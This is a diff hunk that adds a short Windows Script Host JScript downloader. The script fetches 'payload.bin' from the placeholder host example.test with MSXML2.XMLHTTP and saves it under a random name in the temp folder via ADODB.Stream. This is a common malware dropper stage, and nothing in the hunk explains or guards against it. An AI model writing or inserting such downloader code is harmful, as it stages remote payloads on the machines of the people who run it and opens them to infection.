@@ -1,0 +1,10 @@
+var fso = WScript.CreateObject("Scripting.FileSystemObject");
+var tempPath = fso.GetSpecialFolder(2) + "\\" + fso.GetTempName();
+var xhr = WScript.CreateObject("MSXML2.XMLHTTP");
+xhr.open("GET", "http://example.test/payload.bin", false);
+xhr.send();
+var stream = WScript.CreateObject("ADODB.Stream");
+stream.Open();
+stream.Write(xhr.responseBody);
+stream.SaveToFile(tempPath, 2);
+stream.Close();
